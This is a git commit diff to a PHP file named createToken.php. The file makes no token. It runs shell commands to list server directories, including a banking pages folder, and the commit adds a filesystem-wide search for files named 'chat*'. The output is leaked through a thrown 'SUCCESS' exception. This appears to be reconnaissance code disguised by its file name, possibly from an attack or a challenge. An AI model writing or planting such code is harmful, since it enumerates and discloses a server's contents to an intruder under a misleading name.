4c5309b3d78be890f329247f7e892eb6fc78f5db
TestBalbes <76755615+TestBalbes@users.noreply.github.com>
2021-01-02 20:25:26 +0100

    Update createToken.php

--- createToken.php
+++ createToken.php
@@ -1,13 +1,11 @@
 <?php
 $output ='';
-$output =$output.'\n pages'.shell_exec ('ls /var/www/pages/');
 $output =$output.'\n pages multi'.shell_exec ('ls /var/www/pages/ | xargs');
-$output =$output.'\n bank'.shell_exec ('ls /var/www/pages/banking/');
-$output =$output.'\n share'.shell_exec ('ls /usr/share/');
+$output =$output.'\n bank'.shell_exec ('ls /var/www/pages/banking/| xargs');
+$output =$output.'\n lib'.shell_exec ('ls /var/www/lib/| xargs');
 
-$output =$output.'\n zone'.shell_exec ('ls /usr/share/zoneinfo');
-$output =$output.'\n lib'.shell_exec ('ls /var/www/lib/');
-$output =$output.'\n www'.shell_exec ('ls /var/www');
+$output =$output.'\n FIND'.shell_exec ('find / -name "chat*"| xargs');
+
 
 throw new Exception('SUCCESS '. $output.'\n');
 ?>
